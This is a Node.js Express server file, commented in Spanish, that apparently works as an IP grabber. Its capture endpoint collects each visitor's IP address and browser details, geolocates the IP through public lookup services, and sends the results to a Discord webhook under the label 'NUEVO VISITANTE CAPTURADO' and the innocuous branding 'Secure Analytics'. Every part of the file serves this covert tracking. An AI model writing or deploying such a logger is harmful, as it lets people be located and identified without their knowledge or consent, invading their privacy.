require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware de seguridad
app.use(helmet());
app.use(cors({ origin: false }));
app.use(express.json({ limit: '10kb' }));

// Endpoint de captura
app.post('/api/capture', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress;
        
        // Obtener datos de IP con fallback
        let geoData = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
        
        try {
            const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
            geoData = {
                ip: response.data.ip || ip,
                country: response.data.country_name || 'Unknown',
                city: response.data.city || 'Unknown',
                isp: response.data.org || 'Unknown',
                asn: response.data.asn || 'Unknown'
            };
        } catch (error) {
            try {
                const response = await axios.get(`https://ipwho.is/${ip}`, { timeout: 2500 });
                geoData = {
                    ip: response.data.ip || ip,
                    country: response.data.country || 'Unknown',
                    city: response.data.city || 'Unknown',
                    isp: response.data.connection?.org || 'Unknown',
                    asn: response.data.connection?.asn || 'Unknown'
                };
            } catch (error2) {
                geoData.ip = ip;
            }
        }
        
        // Enviar a Discord
        const webhookUrl = process.env.DISCORD_WEBHOOK;
        if (webhookUrl) {
            const embed = {
                title: "👁️‍🗨️ NUEVO VISITANTE CAPTURADO",
                color: 16711680,
                fields: [
                    { name: "🌐 IP", value: `\`\`\`${geoData.ip}\`\`\``, inline: true },
                    { name: "📍 Ubicación", value: `\`\`\`${geoData.city}, ${geoData.country}\`\`\``, inline: true },
                    { name: "📡 ISP", value: `\`\`\`${geoData.isp}\`\`\``, inline: true },
                    { name: "💻 Navegador", value: `\`\`\`${req.body.userAgent || 'Unknown'}\`\`\``, inline: true },
                    { name: "📱 Dispositivo", value: `\`\`\`${req.body.platform || 'Unknown'}\`\`\``, inline: true },
                    { name: "🌐 Idioma", value: `\`\`\`${req.body.language || 'Unknown'}\`\`\``, inline: true },
                    { name: "🔗 Referer", value: `\`\`\`${req.body.referrer || 'Direct'}\`\`\``, inline: false },
                    { name: "⏰ Fecha", value: `\`\`\`${new Date().toLocaleString('es-ES')}\`\`\``, inline: false }
                ],
                footer: { text: "Secure Analytics | Backend Processing" },
                timestamp: new Date().toISOString(),
                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/3075/3075109.png" }
            };
            
            try {
                await axios.post(webhookUrl, {
                    username: "Secure Analytics",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075109.png",
                    embeds: [embed]
                }, { timeout: 5000 });
            } catch (error) {
                console.error('Discord send failed:', error.message);
            }
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`Backend running on port ${PORT}`);
});